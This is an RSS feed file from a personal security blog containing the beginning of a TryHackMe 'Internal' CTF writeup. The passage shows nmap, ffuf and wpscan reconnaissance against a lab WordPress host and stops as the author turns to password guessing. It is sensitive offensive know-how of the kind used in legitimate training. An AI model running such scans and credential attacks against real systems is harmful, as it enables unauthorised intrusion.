@@ -1,0 +1,846 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jenkins on 0000FF</title><link>https://simonefelici.github.io/tags/jenkins/</link><description>Recent content in Jenkins on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 01 Jan 2024 18:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/jenkins/index.xml" rel="self" type="application/rss+xml"/><item><title>Internal Writeup THM</title><link>https://simonefelici.github.io/p/internal-writeup-thm/</link><pubDate>Mon, 01 Jan 2024 18:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/internal-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1495592822108-9e6261896da8?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Internal Writeup THM" />&lt;p>The first thing that I am going to do is a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A 10.10.186.60
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-31 14:46 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> internal.thm &lt;span class="o">(&lt;/span>10.10.186.60&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.055s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I found 2 ports,&lt;/p>
+&lt;ul>
+&lt;li>22(SSH)&lt;/li>
+&lt;li>80(HTTP)&lt;/li>
+&lt;/ul>
+&lt;p>The first thing that I am going to do is exploring the web page in port 80.&lt;/p>
+&lt;p>I get meeted by the Apache2 Ubuntu Default Page, so now I know that the server is running the ubuntu and Apache2.&lt;/p>
+&lt;p>But that’s all forn know, so I started a subdomain/subdirectory enumeration,&lt;/p>
+&lt;p>The directory that I have found are those:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.186.60:80/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.186.60:80/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5064ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6097ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">blog &lt;span class="o">[&lt;/span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">javascript &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpmyadmin &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 341ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wordpress &lt;span class="o">[&lt;/span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From there I can see that the server is powered by wordpress, and runs javascript.&lt;/p>
+&lt;p>So now I am just going to explore these subdirectories more…&lt;/p>
+&lt;p>So, for now I have:&lt;/p>
+&lt;ul>
+&lt;li>Apache 2.4.29&lt;/li>
+&lt;li>Wordpress 5.4.2&lt;/li>
+&lt;li>MySQL&lt;/li>
+&lt;/ul>
+&lt;p>They are old version, so maybe I can find something on the internet.&lt;/p>
+&lt;p>Also I have 2 login pages:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="http://internal.thm/blog/wp-login.php" target="_blank" rel="noopener"
+>http://internal.thm/blog/wp-login.php&lt;/a>&lt;/li>
+&lt;li>http://10.10.186.60/phpmyadmin/&lt;/li>
+&lt;/ul>
+&lt;p>Now I try to get some information directly trough wordpress, using wpscan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wpscan --url 10.10.186.60/blog -e u vp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_______________________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __ _______ _____
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> / / __ &lt;span class="se">\ &lt;/span>/ ____&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> /&lt;span class="se">\ &lt;/span> / /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>__&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>___ ___ __ _ _ __ ®
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \/&lt;/span> &lt;span class="se">\/&lt;/span> / &lt;span class="p">|&lt;/span> ___/ &lt;span class="se">\_&lt;/span>__ &lt;span class="se">\ &lt;/span>/ __&lt;span class="p">|&lt;/span>/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39;_ \
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \ /\ / | | ____) | (__| (_| | | | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \/ \/ |_| |_____/ \___|\__,_|_| |_|
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> WordPress Security Scanner by the WPScan Team
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Version 3.8.25
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Sponsored by Automattic - https://automattic.com/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">_______________________________________________________________
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Started: Sun Dec 31 15:10:27 2023
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Interesting Finding(s):
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Headers
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Headers (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://codex.wordpress.org/XML-RPC_Pingback_API
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress readme found: http://10.10.186.60/blog/readme.html
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 60%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.iplocation.net/defend-wordpress-from-ddos
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://github.com/wpscanteam/wpscan/issues/1299
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Emoji Settings (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>wp-includes&lt;span class="se">\/&lt;/span>js&lt;span class="se">\/&lt;/span>wp-emoji-release.min.js?ver&lt;span class="o">=&lt;/span>5.4.2&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confirmed By: Meta Generator (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>WordPress 5.4.2&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> The main theme could not be detected.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Enumerating Users &lt;span class="o">(&lt;/span>via Passive and Aggressive Methods&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span class="o">===================================================================================================================================================================================================&lt;/span>&amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">10&lt;/span> / 10&lt;span class="o">)&lt;/span> 100.00% Time: 00:00:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> User&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> Identified:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Confirmed By: Login Error Messages &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> No WPScan API Token given, as a result vulnerability data has not been output.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> You can get a free API token with &lt;span class="m">25&lt;/span> daily requests by registering at https://wpscan.com/register
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Finished: Sun Dec &lt;span class="m">31&lt;/span> 15:10:31 &lt;span class="m">2023&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Requests Done: &lt;span class="m">48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Cached Requests: &lt;span class="m">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Sent: 11.895 KB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Received: 302.953 KB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Memory used: 150.684 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Elapsed time: 00:00:03
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here we can see that I have retrieved an username, Admin!&lt;/p>
+&lt;p>Now I can try to retrieve the password:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
